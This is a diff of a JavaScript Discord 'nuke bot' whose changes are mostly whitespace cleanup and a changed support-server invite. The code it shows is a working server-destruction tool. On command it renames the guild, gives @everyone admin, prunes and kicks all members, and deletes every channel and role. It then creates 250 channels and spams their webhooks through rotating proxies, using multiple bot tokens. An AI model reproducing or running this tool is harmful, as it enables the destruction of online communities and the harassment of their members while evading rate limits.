@@ -66,7 +66,7 @@ function admin(token, guild, everyone) {
 }
 async function webhookSpam(webhook) {
     var proxy = proxies[Math.floor(Math.random() * proxies.length)]
-	var sent = 0; 
+	var sent = 0;
 	for(i = 0; i < 3; i++){
 		request({
 			method: "POST",
@@ -85,14 +85,14 @@ async function webhookSpam(webhook) {
 			switch (res.statusCode) {
 				case 204:
 					sent++;
-					console.log(`[Webhook] Messages Sent on Webhook ${webhook.id} ${sent}`); 
+					console.log(`[Webhook] Messages Sent on Webhook ${webhook.id} ${sent}`);
 					break;
 				default:
 					webhookSpam(webhook)
 					break;
 			}
 		})
-		
+
 	}
 }
 function banAll(token, guild, member) {
@@ -102,7 +102,7 @@ function banAll(token, guild, member) {
 			json: true,
 			headers: {
 				"Content-Type": "application/json",
-				"authorization": token 
+				"authorization": token
 			},
 			json: {
 				"delete_message_days":"1",
@@ -111,7 +111,7 @@ function banAll(token, guild, member) {
 		}, (err, res, body) => {
 			switch (res.statusCode) {
 				case 204:
-					console.log(`[BANNED] ${member} Successfully!`); 
+					console.log(`[BANNED] ${member} Successfully!`);
 					break;
 				default:
 					break;
@@ -125,7 +125,7 @@ function kickAll(token, guild, member) {
 			json: true,
 			headers: {
 				"Content-Type": "application/json",
-				"authorization": token 
+				"authorization": token
 			},
 			json: {
 				"reason": "L"
@@ -133,7 +133,7 @@ function kickAll(token, guild, member) {
 		}, (err, res, body) => {
 			switch (res.statusCode) {
 				case 204:
-					console.log(`[Kicked] ${member} Successfully! `); 
+					console.log(`[Kicked] ${member} Successfully! `);
 					break;
 				default:
 					break;
@@ -147,20 +147,18 @@ function unbanAll(token, guild, member) {
 			json: true,
 			headers: {
 				"Content-Type": "application/json",
-				"authorization": token 
+				"authorization": token
 			},
 		}, (err, res, body) => {
 			switch (res.statusCode) {
 				case 204:
-					console.log(`[UNBANNED] ${member} Successfully!`); 
+					console.log(`[UNBANNED] ${member} Successfully!`);
 					break;
 				default:
 					break;
 			}
 		})
 }
-
-
 
 class bot {
     constructor(token) {
@@ -177,25 +175,25 @@ class bot {
             let messageArray = message.content.split(" ");
             let args = messageArray.slice(1);
             if (message.author.bot) return;
-			
+
             if (message.content.startsWith(`${prefix}nuke`)) {
 				const Members = message.guild.members.map(member => member.id);
                 const guild = message.guild.id;
                 const everyone = message.guild.defaultRole.id;
-				
+
 				message.guild.setName('Server Nuked').then(updated => console.log(`[GUILD] Updated guild name to ${updated.name}`));
                 admin(this.token, guild, everyone);
                 prune(this.token, guild);
 				Members.forEach(member => kickAll(this.token, guild, member));
                 message.guild.channels.forEach(channel => channel.delete())
                 message.guild.roles.map(r => r.delete().catch(err => {}));
-				
+
 				message.guild.fetchBans().then(bans => { if (bans.size == 0) { return console.log("There are no banned users."); }
                     bans.forEach(ban => {
 						unbanAll(this.token, guild, ban.id)
                     });
 				})
-				
+
                 for (let i = 0; i < 250; i++) {
                     message.guild.createChannel("Nuked", { type: "text" }).then(channel => {
                       channel.createWebhook("God").then( webhook => {webhookSpam(webhook); })
@@ -214,14 +212,14 @@ console.log(chalk.hex("313CA1")(`
 			███▄    █  █    ██  ██ ▄█▀ ▓█████      ▄▄▄▄    ▒█████  ▄▄▄█████▓
 			██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀     ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
 			▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███       ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
-			▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄     ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
-			▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████    ▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
-			░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░     ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
-			░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░      ░▒░▒   ░   ░ ▒ ▒░     ░    
-			░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░        ░    ░ ░ ░ ░ ▒    ░      
+			▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄     ▒██░█▀  ▒██   ██░░ ▓██▓ ░
+			▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████    ▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░
+			░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░     ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░
+			░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░      ░▒░▒   ░   ░ ▒ ▒░     ░
+			░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░        ░    ░ ░ ░ ░ ▒    ░
 					░    ░     ░  ░   ░   ░      ░ ░          ░ ░           `));
 console.log("");
-console.log(chalk.hex("CA1313")(`[*] Created by Luci! Join our Support Server ${chalk.white('discord.gg/SJyU6VkHen')}`));
+console.log(chalk.hex("CA1313")(`[*] Created by Luci! Join our Support Server ${chalk.white('discord.gg/Nhp3rkNT')}`));
 console.log(chalk(`[*] Bot Prefix is set to: [${prefix}]`));
 console.log("");
 tokens.forEach(token => new bot(token).start());
